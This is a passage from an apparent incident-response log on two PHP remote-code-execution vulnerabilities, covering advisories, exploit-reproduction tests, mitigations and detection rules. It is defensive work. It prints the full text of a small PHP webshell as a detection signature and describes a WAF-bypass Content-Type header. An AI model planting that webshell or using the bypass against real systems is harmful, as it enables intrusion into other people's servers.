(`06-soc-triage/INCIDENT-RESPONSE.md`). Organisations that followed it need **no further action**.

PHP also notes: *"Applications that never change the serialize handler at runtime can keep the
feature enabled."*

### 28.3 Relationship to the "second vulnerability" claim — the honest update
This does **not** vindicate the claim that *"the patch doesn't work / there's a second unpatched
version of this RCE"*:

- **CVE-2026-115560 is a separate, narrow, configuration-dependent issue** — not a bypass of the
  fixes for CVE-2026-109618 / 109619.
- It requires an application that **deliberately changes `session.serialize_handler` at runtime**,
  which PHP describes as unusual.
- No patches are being rushed; it is queued for the **regular release cycle**.
- Its mitigation has been public **since 21 Oct**.

**But it does require a small correction to our earlier wording.** We said *"no known unpatched
second vulnerability"*. More precisely:
> **No unpatched bypass of the critical RCE fixes exists. There is now a third, narrow, low-impact
> CVE (CVE-2026-115560) in the same code area, requiring an unusual configuration, already
> mitigated by a setting published on 21 Oct, and scheduled for the next regular release.**

**Probable origin of the noise (inference, not confirmed):** the 21 Oct Fediverse claim described
*"another one"* and *"works on 8.5.12"*, and the PHP team's 22 Oct refutation described *"a crash in
one component in slightly unlikely scenario"*. The language and timing line up with this class of
issue. If so, the claim pointed at something real but **mischaracterised** it — a separate edge case
presented as a broken patch.

### 28.4 Status of CVE-2026-115560
| Item | State (2026-10-23 10:00 UTC) |
|---|---|
| php.net advisory | ✅ published (informational, no fix) |
| **NVD record** | ❌ **not yet published** (`totalResults: 0`) |
| Full advisory | ⏳ with next regular bugfix release |
| Patch available | ❌ none yet — config mitigation only |
| Mitigation | `session.upload_progress.enabled=0` (public since 21 Oct) |
| Severity | Undisclosed; PHP calls it an *"unlikely RCE vector"* |

### 28.5 Action for readers
1. **If you already applied `session.upload_progress.enabled=0`** (our containment step #1):
   **nothing to do.** Keep it in place until the next PHP release and beyond.
2. **If you left upload progress enabled** and your app changes `session.serialize_handler` at
   runtime: disable it now, or confirm you never call `ini_set('session.serialize_handler', …)`.
3. **Continue with the 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35 upgrade** — that is still the fix for the
   two critical CVEs, and it is unaffected by this advisory.
4. Watch for the next regular PHP release; a full advisory for CVE-2026-115560 lands with it.

## 29. 🚨 MATERIAL — 2026-10-23 18:45 UTC — Palo Alto PAN-OS / Panorama are affected (fixes pending)

### 29.1 The exposure expansion that matters
Palo Alto Networks confirmed **PAN-OS and Panorama are affected** by both CVEs. This is the single
biggest change to the exposure picture since disclosure: a **network security appliance management
plane** is in scope, and **no special configuration is required** to be affected.

| Item | Detail |
|---|---|
| Affected products | **PAN-OS / Panorama** 10.2, 11.1, 11.2, 12.1, 12.2 branches |
| Configuration needed | **None** — "No special configuration is required to be affected by this issue" |
| PAN's product severity | **CVSS-B 8.7 HIGH**, suggested urgency **MODERATE** |
| **Fixed versions** | ❌ **NOT YET RELEASED** — ETAs **26–30 Oct 2026** |
| Highest risk | Management interface reachable from the internet |
| Not affected | GlobalProtect App, Prisma (Access/Cloud/SD-WAN), Cortex XDR, XSIAM, XSOAR, Xpanse, Cloud NGFW |
| Already remediated | **Cortex XCORE (SaaS)** — patch 21 Oct; **WildFire Cloud** — patch 22 Oct |

**Pending fixed versions (highlights; full table in the PAN advisory):**
- PAN-OS 11.2: `11.2.10-h16` (ETA 10/26), `11.2.13-h4` (10/27), `11.2.16-h1` (10/28), `11.2.7-h23` (10/29), `11.2.4-h23` (10/30)
- PAN-OS 10.2: `10.2.13-h27` (10/27), `10.2.16-h12` (10/27), `10.2.10-h42` (10/29), `10.2.7-h39` (10/30)
- PAN-OS 12.1 / 12.2: `12.2.4-h1` (10/28), `12.1.7-h11` (10/28), `12.1.4-h13` (10/29), `12.1.10-h3` (10/30)
- PAN-OS 11.1: `11.1.16-h4` (10/26) through `11.1.7-h12` (10/30)

### 29.2 Interim mitigations (until PAN-OS fixes ship)
1. **Restrict management-plane access** — do not expose the MGT interface to the internet; this is
   the highest-leverage control and PAN states risk is highest when it is exposed.
2. **Threat Prevention**: enable Threat IDs **543004, 97622, 97623, 97624, 97625** (Applications
   and Threats content **9162+**). These require the firewall to actually *see* management traffic:
   route MGT traffic through a DP port, replace the inbound management certificate, **decrypt
   inbound traffic to the management interface**, and enable threat prevention on management
   services. Without that chain, the signatures do not protect the MGT plane.
3. **Frontier Virtual Patching (ATP Plus)** on PAN-OS 12.2.4+: advance coverage via Threat ID
   **543004**, released 20 Oct 21:00 PT.

### 29.3 Industrial knock-on — Siemens (SSA-566512, 23 Oct)
Siemens published **SSA-566512**: **RUGGEDCOM APE1808** devices hosting **PAN-OS** (10.2, 11.1,
11.2, 12.1, 12.2 — all versions) are affected by both CVEs. Remediation: *"contact customer
support to receive patch and update information"* — i.e. **no self-service fix**. This is the
route by which an IT appliance vulnerability reaches OT/industrial environments.

### 29.4 Why the numbers moved today
| Signal | 23 Oct change | Reading |
|---|---|---|
| **EPSS 109618** | 5.31% → **11.62%** (96th pct) | Sharp re-rating, consistent with appliance exposure + PoC reports |
| EPSS 109619 | 5.76% → **5.99%** (93.3 pct) | Mild rise |
| **KEV catalog** | 1,754 → **1,755** | New entry is **CVE-2026-114625 (Arista VeloCloud SQLi)**, **not** php2shell |
| NVD 109618 | refs 3→**5**, status `Analyzed` | Added **Siemens SSA-566512** + oss-security 2026/10/23/5 |
| NVD 109619 | refs 12→**14**, status `Analyzed` | Added Siemens SSA-566512 + oss-security 2026/10/23/4 |
| PoC repos | 786 → **835** (+49) | Largest single-hour jump since disclosure |

**Unit 42 states it "has seen proof of concept of these vulnerabilities" and notes at least one
European government took its website offline as a precaution.** No public report yet of PAN-OS
management-plane exploitation in the wild — but PAN's own urgency is MODERATE, and the management
interface is exactly the sort of target that gets scanned immediately once a PoC is public.

### 29.5 What this changes in practice
- **Asset owners now include network teams, not just web/app teams.** Firewall and Panorama
  administrators need to be in the remediation conversation — they are often outside the PHP
  patching workflow entirely.
- **PHP patching is not the fix here.** PAN-OS ships its own PHP; you cannot patch the appliance's
  PHP — you must wait for PAN-OS maintenance releases (26–30 Oct) or apply the interim controls.
- **Management-plane exposure is the deciding factor.** An internet-reachable firewall MGT
  interface running affected PAN-OS is a far higher-risk asset than an internal one.
- **Detection value increases:** appliance management HTTP traffic is low-volume and predictable,
  so the multipart/`PHPSESSID` anomalies in this package stand out more clearly there than on busy
  application servers.

## 30. INCIDENT STATUS — 2026-10-23 20:00 UTC — no publicly confirmed victim  ⚠️ SUPERSEDED BY §39

> **⚠️ SUPERSEDED (2026-10-25):** the "no confirmed victim" conclusion below was wrong at the time of
> writing — Unit 42 had published a confirmed European-government intrusion on 23 Oct and we had not yet
> ingested it. See **§39**. Everything else in this section (exploit difficulty, disclosure lag, hunting
> window) still holds.


### 30.1 The position
**No organisation has publicly confirmed a successful compromise from CVE-2026-109618 / 109619.**
Attempted exploitation is heavy and continuous (Cloudflare: "millions"; Wordfence: 74k+ blocked; AWS:
broad attempts), and one attempt predates disclosure (17 Oct), but **no confirmed shell, no confirmed
data theft, no KEV listing**.

### 30.2 The single victim claim was retracted by its own author
**Sophos** reported one successful exploitation in customer environments (payload `/tmp/nfs`,
Mirai variant "Potassium", C2 `134[.]199[.]154[.]64`), then **corrected it**: telemetry showed
scanning and failed attempts, the payload was never delivered, and there is *"no evidence of a
successful compromise."* Any source citing "Sophos confirmed a compromise" is stale.

### 30.3 Disruption without compromise
- France: tax authority, several prefectures, family-benefits agency on maintenance pages;
  **CERT-FR CERTFR-2026-ALE-014** (updated 22 Oct for PoC availability).
- **Orange** took subsidiary sites/apps offline as precaution.
- **Oh Dear**: **18.8%** of monitored sites offline at peak vs 0.9% the week prior — self-inflicted.

### 30.4 What attackers achieved
~10 attacker workspaces with tooling, **none holding a victim list, shell or stolen data**; one mass
operator ran 10 passes against ≤123 servers with **zero shells**. Consensus (VulnCheck, watchTowr,
Rapid7, Sansec, Sophos, Hunt.io): **no public PoC bypasses ASLR on x86-64**; most crash on a default
install. Target preference: commerce/billing/hosting on unpatched PHP 5.x–8.1.

### 30.5 Why absence of victims ≠ safety
1. **The disclosure path is silent by design** — 109619 returns stolen memory in a `PHPSESSID`
   cookie; no shell, no crash, no child process, minimal telemetry.
2. **Compromise may predate disclosure** — AWS's 17 Oct attempt.
3. **Breach-disclosure lag** is weeks-to-months; many never publish.
4. Actors with **private working exploits** have no incentive to announce.

**Therefore:** absence of a named victim evidences that *mass noisy exploitation has not publicly
succeeded*; it does not evidence that targeted quiet compromise has not occurred. Treat 17–23 Oct as
a potential exposure window for hunting purposes.

### 30.6 Watch items that would change this
First confirmed compromise with technical detail · a public x86-64 ASLR bypass · KEV addition ·
a hosting provider reporting successful intrusion · post-incident reports citing php2shell as
initial access.

## 31. 🚨 MATERIAL — 2026-10-23 21:30 UTC — `display_errors=Off` RCE is achievable (private), and our earlier "unverified" status was too comfortable

### 31.1 What changed
Two independent commercial research teams have now demonstrated **RCE with ASLR enabled and
`display_errors=Off`** — i.e. the recommended production configuration that we had previously
recorded as *"NOT reproduced / unverified"*:

| Who | When | Result | Availability |
|---|---|---|---|
| **VulnCheck** | 22 Oct | First known exploit chaining a **memory leak → RCE on PHP 8.4.26, x86-64, ASLR enabled, `display_errors=off`** | **Private** — Initial Access Intelligence customers only |
| **CovertSwarm** | 23 Oct | Independent working exploit, **ASLR enabled + error display disabled**, tested on **AArch64 PHP 8.5.11** (Apache + mod_php); also one local WordPress lab | **Private** — customer-only, deliberately not releasing |

VulnCheck's Spencer McIntyre: *"We haven't identified another public or commercial exploit that
achieves this under the same conditions."* CovertSwarm confirms controls on **8.5.12 did not execute**
— patched builds resisted.

**Implication:** `display_errors=Off` is **not a security control** against this bug class. It is a
speed bump that multiple teams have already driven over. Any earlier comfort derived from
"production config is harder to exploit" is now retired.

### 31.2 The public claim — and our failure to reproduce it
The most-starred weaponisation repo (`9bie/php2shell-bypass-aslr-exp`, **1,218★**, 387 forks) was
substantially reworked on **23 Oct** and now claims exactly this: **no `display_errors`, no
`memory_limit` change, official prefork `MaxRequestWorkers=150`, 10/10 success, 3–4 s per run.**

**We tested it hands-on and could not reproduce it:**
- Target: stock `php:8.4.26-apache` + official `php.ini-production` → **`display_errors => Off`**,
  `memory_limit=128M`, prefork 150 — confirmed by their own `run_pure.sh`.
- **Official-worker mode: 8/8 attempts failed.** **Single-worker mode: 6/6 failed.**
- Failure point: the B1 stale-id OOB read / leak stage — `no heap pointers in leak window` or
  `no Set-Cookie in leak response (0 bytes)`.
- Binary identity **matches their registry exactly**: our `libphp.so` SHA-256
  `51663cf883b1223436d4c99f31dd0225735ea5573665e4242621eee7f4ee679c` = their documented x86_64
  profile, with `zval_ptr_dtor=0x65EB60` (the stale `0x613c50` from the earlier version is gone).

**Independent corroboration of our failure:** a separate researcher's write-up
(`xuehuolll/php2shell…/analysis/14-display-errors-off.md`) also tried to port 9bie's A/B parameters
to the official image and got **`cookie_len 32 · ptrs 0`** — same non-reproduction. Their conclusion:
the primitive depends on exact page/bin state at `php_session_send_cookie()` entry and **needs
per-build calibration**; the published parameters did not transfer.

**So the honest status is:**
> `display_errors=Off` RCE is **confirmed achievable** by at least two capable teams with private
> exploits. A **public** exploit claiming the same is published with detailed offsets and evidence
> logs, but **we could not reproduce it (14/14 failed)** and neither could another independent
> researcher using the earlier iteration. **Capability: proven for targeted actors; public
> reliability: unproven.**

### 31.3 Why this matters for risk and detection
- **Removes the "we're fine because production config" assumption.** The remaining barrier is *exploit
  maturity*, not configuration hardening.
- **Raises the value of behaviour-based detection** (this package) — it does not depend on which
  exploit variant succeeds.
- **Validates the detection design:** CovertSwarm describes their chain as *"a sequence of HTTP
  requests, not a single request"* — exactly what the flow-correlation and worker-state rules target.
- **Detection caveat stands:** the disclosure artifact appears even when exploitation fails, so our
  rules detect *attempts*, including from these new chains.

### 31.4 Revised status of the public-capability question
| Claim | Status |
|---|---|
| Public PoCs bypass ASLR on x86-64 with `display_errors=Off` | **Still unproven.** None verified by us or by an independent reviewer |
| Capable actors can do it | **YES — two confirmed private exploits** |
| `display_errors=Off` protects you | **NO — retired assumption** |
| Patched builds resist these chains | **YES — 8.5.12 controls failed to execute in CovertSwarm's testing** |

## 32. MATERIAL — 2026-10-24 00:00 UTC — PAN-OS advisory revision: signature coverage expanded ~5×

### 32.1 What changed
Palo Alto revised the PAN-OS advisory on **2026-10-24** with the note *"Threat ID released and details
updated"*. **No fixes have shipped** — 20 `ETA:` markers remain, still 26–30 Oct.

**The Threat Prevention ID list grew from 5 signatures to 25:**

| State | Threat IDs |
|---|---|
| Previously (21–23 Oct) | `543004`, `97622`, `97623`, `97624`, `97625` |
| **Now (24 Oct)** | `543004`, `97622`–`97625`, **`97643`, `97647`, `97649`, `97652`, `97653`, `97656`, `97657`, `97658`, `97659`, `97662`, `97663`, `97664`, `97670`, `97671`, `97672`, `97673`, `97674`, `97676`, `97677`, `97678`** |
| Content versions | **9162, 9163, 9164 and later** |

### 32.2 Why this matters operationally
- Organisations that enabled **only the five IDs quoted in earlier guidance** (including our own
  package) are **under-covered relative to current signatures**. The additional 20 IDs arrived in
  content **9163 / 9164**, which many estates will not have pulled yet.
- **Action:** confirm both that the content version is **≥9164** and that the full current ID list is
  enabled — not just the original five. Check the advisory for the authoritative list; it is being
  extended as new signature variants ship (expected, given the exploit is mutating).
- This is a *good* signal on the defensive side: PAN is iterating signatures against observed exploit
  variation, which matches AWS/Cloudflare reports of payload mutation.

### 32.3 Status unchanged otherwise
No fixed versions; ETAs 26–30 Oct intact; Panorama still undated (WF-500/WF-500-B later corrected to NOT
affected — see §45); PAN continues to
say it is unaware of exploitation against its products; impact still assessed as availability-only
(`VC:N/VI:N/VA:H`).

## 33. MATERIAL (capability) — 2026-10-24 07:00 UTC — first credible PUBLIC PHP-FPM chain (conditional)

### 33.1 What appeared
A public repo **`VABISMO/php2shell-nginx-fpm-full-rce`** (created 22 Oct, pushed 24 Oct 06:59, MIT,
CI workflows incl. a "live FPM lab") publishes a **nginx + PHP-FPM** chain for **CVE-2026-109619**
(`BG(unserialize)` stale state) on **8.4.25 / 8.4.26** — fixed in **8.4.27**, with per-version
`profiles/*-fpm.json` and a `calibrate` mode for other builds. It is explicitly the "FPM-only
extraction" of `devploit/php2shell`.

Notable properties:
- **ASLR bypass over HTTP** — a stale-string leak recovers both bases; **no `/proc`, no local shell,
  no `display_errors` dependency** (the README never mentions it).
- **Verified output shown**: `chunk=`/`pie=` leak, then `no-oracle` run producing
  `uid=1000(cryptocalypse)` via a proof file; the expected **502** is the worker dying after the
  command runs.
- Claims coverage of any vulnerable release on the tracked branches after one calibration run.

### 33.2 The preconditions — and they are real
The README is unusually explicit that this is **"not pre-auth or universal"**. Required shape:

1. **Two HTTP surfaces with *different* memory limits** — a *builder* pool large enough to persist a
   ~4 MB session file, and a *consumer* pool **low enough that decoding it OOMs after RINIT**
   (their lab: 8M consumer / 64M builder). Can be two pools on one host or two hosts sharing storage.
2. **Session storage shared** between the surfaces (`session.save_handler=files`, writable session dir).
3. **Single-worker pools, or reliable worker pinning**, and **`pm.max_requests` must not recycle** the
   worker between arm and fire.
4. An **application operation that calls `session_start()`** and decodes the session after RINIT.
5. `session.upload_progress` is used for the session-file plant half (the "poison" primitive).

### 33.3 Honest assessment
| Question | Answer |
|---|---|
| Is a public FPM exploit real now? | **Yes — credible, documented, CI-backed, with profiles** |
| Does it need `display_errors=On`? | **No** |
| Does it work on a stock single-pool 128M host? | **No** — the memory-limit asymmetry is the core precondition |
| Where does it work? | **Multi-pool / shared-session deployments** (shared hosting, container fleets with shared session volumes, tuned app tiers) |
| Reproduced by us? | **No** — not attempted; lab setup is non-trivial and the preconditions are deployment-shaped rather than default |

**What this changes:** FPM was already in scope (PHP's advisory says so, and our §11 notes it), but
this is the first **public** tool with a plausible end-to-end FPM chain. It does **not** become a
mass-exploitation switch, because it needs a deployment shape that the *majority* of single-pool
production hosts do not have.

### 33.4 Detection and mitigation value (the useful part)
- **Distinctive artefact: worker death.** The chain executes during session shutdown and then kills
  the worker — expect **FPM worker restarts / 502 bursts** correlated with large multipart bodies.
  Our triage guidance should pair 502 spikes with `PHPSESSID` anomalies; the package's existing
  YARA `Oversized_Session_File` rule covers the 4 MB planted session artefact directly.
- **Mitigation that actually breaks it:** `session.upload_progress.enabled=0` (kills the plant half),
  plus worker recycling (`pm.max_requests`) and per-pool memory parity, which destroy the two
  preconditions outright. Isolating session directories between pools removes condition 2.
- **Validates our detection design again:** exploitation is a **sequence across requests**, so
  flow-correlation and worker-state rules are the right shape.

## 34. MATERIAL (capability assessment) — 2026-10-24 — public exploit framework: arm64 demos, x86_64 reproduction fails

### 34.1 What it is
`JoasASantos/php2shell-exploit` (created 2026-10-22, pushed 24 Oct, **163★ / 43 forks**) — a
substantial exploit framework, not a script drop: `exploit.py` (31 KB), `exploit_v2.py` (40 KB),
modules for calibration/forging/leaking/payloads/transport/worker-pinning, Docker labs
(php:8.4.26-apache, WordPress, phpMyAdmin), and recorded asciinema demos.

Claims: **pre-auth, cookie-less, pure-HTTP RCE**; ASLR bypass via ~800 KB heap OOB read; v1
`pDestructor=zif_system`; v2 `auto_prepend_file` overwrite ("crash-free after setup"); five chains
(htaccess / gadget / zero / grooming). Its amd64 profile is labelled
*"Verified 20/20 on stock php.ini-production."*

### 34.2 Our reproduction — on their own lab, with their own offsets
Executed `docker/docker-compose.yml` unchanged (Debian 13.7, **x86_64**, PHP/8.4.26, mod_php,
`display_errors` empty ⇒ Off, `session.upload_progress.enabled=1`). Offsets extracted **with their
tool**: `zif=0x465370 dtor=0x65eb60` (matches our independent extraction of the same image).

| Run | Result |
|---|---|
| recon | PHP/8.4.26, mod_php probable, **MPM unknown**, `upload_progress` "inactive or hidden" (wrong — `ini_get` = 1) |
| v1 webshell ×5 | A1 OOM → **HTTP 500 reached**, B1 leak → **"no heap pointers in leak window"** → 5/5 fail |
| v2 `grooming` | gadget failed → htaccess fallback → same leak failure |
| explicit amd64 profile + offsets | same leak failure |

**Same failure stage as every prior public claim (9bie, xuehuolll): the leak/ASLR-bypass window is
empty under `display_errors=Off`.**

### 34.3 The architecture nuance (why the demos succeed)
The recorded casts run on **`php-8.4.26-trixie-arm64`** with arm64 offsets
(`zif=0x42cd70 dtor=0x638120`) and print `uid=33(www-data)`; v2 reports
`RCE confirmed — crash-free via PG(auto_prepend_file)`. So the author's evidence is **ARM64**, and
the x86_64 "verified 20/20" claim is **not reproducible**.

### 34.4 What this changes — and what it does not
- **Does not** establish a public working `display_errors=Off` exploit on x86_64. The watch item
  stays open.
- **Does** weaken any assumption that public PoCs are uniformly non-functional: there is now a
  **polished, plausibly arm64-functional** framework. ARM estate (Apple Silicon dev images, ARM
  servers, edge devices) should not be considered safe on "public PoCs fail" reasoning.
- **Requirements keep it conditional:** mod_php + prefork only (no FPM), chunked TE must survive,
  v2 needs a writable webroot; `session.upload_progress.enabled` must be on (PHP default).
- **Mitigation unchanged and effective:** patch + restart PHP; `session.upload_progress.enabled=0`
  removes the exploitation path; worker recycling/pinning defeats the stale-state technique.
- **Detection unchanged:** oversized `PHPSESSID` response cookie, chunked multipart bodies,
  worker deaths/502 bursts.

Full evidence: `php2shell-intel/triage/joas-triage-2026-10-24.md`. Exploit code kept in the working
tree only — **never** in the shareable package.

## 35. ESCALATION (capability CONFIRMED) — 2026-10-24 — public pre-auth RCE reproduced with `display_errors=Off`

**This supersedes the verdict in §34 and closes open watch item #2 ("reliable PUBLIC
display_errors=Off exploit").**

### 35.1 What was run
`JoasASantos/php2shell-exploit` against **its own shipped lab**, unchanged:
`php:8.4.26-apache`, Debian 13.7, stock `php.ini-production` (`display_errors` empty ⇒ **Off**),
`session.upload_progress.enabled=1`, chunked multipart reachable.

| Environment | Apache prefork config | Result |
|---|---|---|
| x86_64 (native) | default lab (`StartServers 5`, `MaxRequestWorkers 10`) | fail — leak window empty |
| **x86_64 (native)** | **single worker** (`MaxRequestWorkers 1`) | **RCE — `uid=33(www-data)`** |
| arm64 (qemu-emulated) | default lab | fail — leak window empty |
| **arm64 (qemu-emulated)** | **single worker** | **RCE — `uid=33(www-data)`** |

**The discriminator is the prefork worker count, not the architecture.**

### 35.2 Proof that is independent of the tool's own output
Command output redirected to a file inside the target, then read directly with `docker exec`:

```
arm64  /tmp/p2s-proof.txt → uid=33(www-data) / aarch64 / www-data
x86_64 /tmp/x64-proof.txt → uid=33(www-data) / x86_64
```

The tool plants `/.p2s.php`, executes in-band, then deletes the webshell (`?rm` handler) — a later
fetch returning 404 is expected, not a failure.

### 35.3 Significance
- **Confirmed public capability:** pre-auth, cookie-less, pure-HTTP RCE with **ASLR bypass and
  `display_errors=Off`**, on a stock PHP 8.4.26 image. No application interaction, no LFI, no
  session poisoning — this is the real bug, not the Orange Tsai-era technique.
- **Constraint:** Apache **mod_php with a single prefork worker**. Multi-worker pools failed at the
  memory-leak stage on both architectures in our tests; the repository's advertised "worker pinning
  for multi-worker pools" is **unproven**.
- Architecture is irrelevant to exploitability — x86_64 works identically.
- This invalidates the earlier comfort position that private tooling was required for
  `display_errors=Off`. Public tooling now covers it.
- **Not** a universal switch: single-worker mod_php can be a low-traffic container, a
  memory-capped deployment, or a deliberately simple pool; the majority of Apache prefork defaults
  ship multiple workers. FPM deployments are unaffected by *this* tool (separate conditional chain).

### 35.4 Mitigation — unchanged and still sufficient
1. **Patch** PHP (8.5.12 / 8.4.27 / 8.3.36 / 8.2.35) — removes the bug outright.
2. `session.upload_progress.enabled = 0` — breaks the exploitation path (the tool's own README lists
   this as the mitigation).
3. Do **not** treat worker count as a control; single-worker hardening is not a mitigation, merely
   the condition under which this particular tool works.

### 35.5 New detection artefacts (added to the package)
- **Hardcoded webshell paths:** `/.p2s.php` (webroot), `/assets/.p2s.php`, `/tmp/.p2s.php`;
  v2 uses `/tmp/.p2s_v2.php` and `.htaccess` with `auto_prepend_file`.
- **105-byte webshell body:** `<?php if(isset($_GET["c"])){system($_GET["c"]);}if(isset($_GET["rm"])){unlink(__FILE__);echo"removed";}?>`
  — high-fidelity YARA target; the `?rm` self-delete handler is unusual and distinctive.
- Suricata: request to any URI ending `.p2s.php`; response body containing the webshell signature.
- Hunting: access-log search for `.p2s.php`, `.p2s_v2.php`, `.htaccess` writes, and `?c=` execution
  patterns on those paths.

## 36. MATERIAL (patch guidance) — 2026-10-24 — regression in the fixed releases; the real bugs behind the "second vulnerability" noise

### 36.1 Verified upstream issues (not rumours — checked via the php-src tracker)
| Issue | State | What it is | Relevance |
|---|---|---|---|
| [php-src#24481](https://github.com/php/php-src/issues/24481) | **open**, `Status: Needs Triage` | Use-after-free in `var_destroy()` during `unserialize()` re-entrancy — a `__destruct` calling `unserialize()` again reads freed memory | **This is the bug behind the "8.5.12 patch is incomplete" claims.** Real, unfixed, **no CVE** (PHP does not assign CVEs to `unserialize()` bugs). Reachable only when an application unserializes attacker-controlled data or code already runs on the host — **not a bypass of the php2shell chain**. |
| [php-src#24488](https://github.com/php/php-src/issues/24488) | **closed**, `Status: Verified`, `Extension: simplexml` | **Regression introduced by 8.4.27 / 8.5.12**: the changed GC double-frees the `SimpleXMLElement` property table when an object converted via `json_encode()`/`(array)`/`get_object_vars()` is collected in a reference cycle → `zend_mm_heap corrupted`, crashed worker | **Affects patched hosts.** Common pattern: `json_decode(json_encode($xml), true)`. Fix merged upstream but **not in any released build yet** as of 24 Oct. |

### 36.2 Why this matters operationally
- The RCE fixes themselves stand: no bypass exists (see §29 / CLARIFICATION doc). The PHP team's
  "unrelated issue with minimal impact" statement maps to **#24481**, which is now documented
  precisely rather than dismissed.
- **A patched host can still crash workers** on ordinary SimpleXML code. That is an availability
  regression, not a security hole — but it will show up in rollout as "8.4.27 broke our app". Teams
  should stage the upgrade, look for `json_decode(json_encode(...))` on SimpleXML objects, and know
  the crash signature (`zend_mm_heap corrupted`).
- Do **not** roll back to a vulnerable build to avoid the regression. Workaround options: avoid the
  conversion-in-cycle pattern, isolate affected endpoints, or wait for the next regular release.

### 36.3 Community mitigation for unpatched hosts (third-party)
`HOSTED-POWER/php_uploadprogress_guard` (143★, C extension, created 21 Oct, v3.2.5 pushed 24 Oct) is a
native PHP module that "mirrors the official fix component by component" so an unpatched PHP loses
each link of the published chain, plus it forces `session.upload_progress.enabled=0` (covering
CVE-2026-115560) and applies upstream fixes for #24481/#24488 by patching from inside the extension.
Prebuilt for Linux x86_64/aarch64 (5.4–8.5) and Windows x64, with checksums.

**Assessment:** potentially useful for hosts that genuinely cannot patch (EOL PHP, frozen vendor
images), but it is a **third-party native extension loaded into the web server** — supply-chain and
stability risk, and it is not a substitute for the official builds. Recommendation: patch first;
if that is impossible, review the source, verify checksums, and test on staging before deploying.

### 36.4 No change to detection
The guard module is defensive; nothing new to detect. The `.p2s.php` artefacts from §35 still stand.

## 37. MATERIAL (detection) — 2026-10-25 — new public research repo; WAF bypass claim VERIFIED, our rules unaffected

### 37.1 What appeared
`dinosn/php-cve-2026-10961x-lab-poc` (**110★ / 24 forks**, created 20 Oct, pushed 25 Oct 05:44) — a
vulnerability-research package making broader claims than prior public work:

| Claim | Status |
|---|---|
| Self-contained RCE on stock **PHP 8.5.11**, four plain HTTP requests, in-band address leak via `PS(id)`→cookie disclosure, 12/12 fires over 8 ASLR generations | their claim — not reproduced by us; consistent in shape with our confirmed reproduction (§35) |
| **52× memory amplification** via duplicate 6-byte multipart headers, defeating `post_max_size` (2.57 MB body OOMs a 128M limit), PHP 7.4–8.5.11 | their claim — plausible, matches the OOM primitive we know |
| **"Three paths survive the 8.5.12 patch"** | **consistent with §36**: they are the separate unfixed issues — `var_destroy` re-entry UAF ([php-src#24481](https://github.com/php/php-src/issues/24481)), serialize-handler mismatch (CVE-2026-115560 territory) and upload-progress injection. **Not a bypass of the two CVEs** — the wording must be kept precise. |
| FPM stale `BG(unserialize)`: session-decode OOM leaves state consumed by the next request; heap-shaped consumption SIGSEGVs the worker | proven as **mechanism + DoS** in their write-up; RCE there is not claimed as proven |
| **WAF signature bypass** via `Content-Type: multipart/form-data, boundary=X` (comma instead of semicolon) | **VERIFIED BY US — see 37.2** |

### 37.2 WAF bypass — verified against a real PHP runtime
Tested on `php:8.4.26-apache` with a normal multipart body:

```
Content-Type: multipart/form-data; boundary=X   → $_POST parsed   (normal)
Content-Type: multipart/form-data, boundary=X   → $_POST parsed   (bypass confirmed)
```

PHP trims the content-type at `;`, `,` and space, so the comma form is accepted identically. Any WAF
signature anchored on `multipart/form-data;` — a very common anchoring — **will not see it**.

**Our rules are unaffected.** Checked all Suricata rules (18 at the time, 21 now) and the ModSecurity config: they match the
substring `Content-Type: multipart/form-data` (or `^multipart/form-data` for ModSecurity), with **no
semicolon requirement**, so the comma variant still fires. This should be stated explicitly in SOC
guidance — it is a concrete differentiator versus rules copied from elsewhere.

### 37.3 Action taken
- Detection docs updated with the content-type bypass and the correct anchoring guidance.
- No rule changes needed (existing rules already match the bypass form).
- Their amplification and FPM claims are recorded as unverified-but-credible; no deliverable change
  derived from them yet.

### 37.4 PAN advisory revision (25 Oct)
Palo Alto re-published CVE-2026-109618: **FAQ section updated**, and additional Prisma product rows
added (Prisma SD-WAN Controller / ION / On-Prem Controller — all **unaffected**). Threat Prevention ID
list **unchanged at 25**; fixes still pending with ETAs **27–30 October**. Nothing material for our
guidance.

## 38. 🚨 ESCALATION (exploitation intensity) — 2026-10-25 — EPSS jumps from ~12% to ~99.98% in one day

### 38.1 The signal
The 2026-10-25 EPSS daily update moved both CVEs from low-teens to near-certain:

| CVE | 23 Oct | 24 Oct | **25 Oct** | Percentile |
|---|---|---|---|---|
| CVE-2026-109618 | 0.11620 | 0.11841 | **0.99981** | 99.98 |
| CVE-2026-109619 | 0.05991 | 0.06217 | **0.99997** | 99.99 |

### 38.2 Verification — this is not a feed error and not a model rebase
Checked against FIRST's **official daily datasets**, not just the API:

| Evidence | Result |
|---|---|
| Same `model_version` all three days | `v2026.06.15` — unchanged |
| `score_date` of the 25 Oct file | `2026-10-25T12:03:13Z` (current) |
| Control CVE-2021-44228 (log4j) | **0.99999 on all three days** — did not move |
| Control CVE-2024-3400 (PAN-OS) | **0.99999 on all three days** — did not move |
| Control CVE-2017-0143 (EternalBlue) | 0.93307 — plausible mid-high, not pinned |
| Control CVE-2026-22777 (obscure) | 0.00342 — plausible low, not pinned |

Because the controls are stable and the model version is identical, the jump is a **real change in
the exploitation evidence feeding the model**, not a re-scoring artefact. An EPSS of ~0.9998 means the
model estimates exploitation in the next 30 days as effectively certain.

### 38.3 What it means — and what it does not
- **Corroborates the "broadly exploited" reporting** (MadPot pre-disclosure attempts, Cloudflare's
  millions of attempts) with an independent, quantitative source.
- It is **not** evidence of a specific victim, nor of a new capability change. KEV remains **NO**
  (catalog 1,756) — CISA has not listed either CVE as of this check.
- Treat as a **mass-exploitation-intensity** signal: expect opportunistic scanning against any
  unpatched estate to be heavy, and treat any oversized-`PHPSESSID` observation as likely hostile
  rather than noise.
- Action for defenders is unchanged — the intensity raises the *likelihood*, not the *remediation*:
  patch + restart, `session.upload_progress.enabled=0`, restrict PAN-OS management planes, hunt from
  17 Oct.

### 38.4 Caveat to state honestly
EPSS is an algorithmic estimate driven by observed exploitation telemetry; a jump this large in one
day can reflect a burst of automated scanning being ingested, and the model's absolute values are not
a probability of *your* compromise. Use it as direction and urgency, never as a per-host verdict.

## 39. ⚠️ CLAIM RAISED AND RETRACTED — 2026-10-25 — Unit 42's "confirmed intrusion" update (withdrawn same day); suspected DPRK staging stands

> **STATUS: RETRACTED BY UNIT 42 (25 Oct, 2:15 p.m. PT).** Sections 39.1–39.2 record a claim we accepted
> and then had to reverse — see **§39.6** for the retraction and the lesson. The suspected DPRK staging
> campaign in §39.3 (CYFIRMA) is separate and still stands. Net position: **no publicly confirmed victim
> tied to these two CVEs**, with one unresolved nuance described in §39.6.

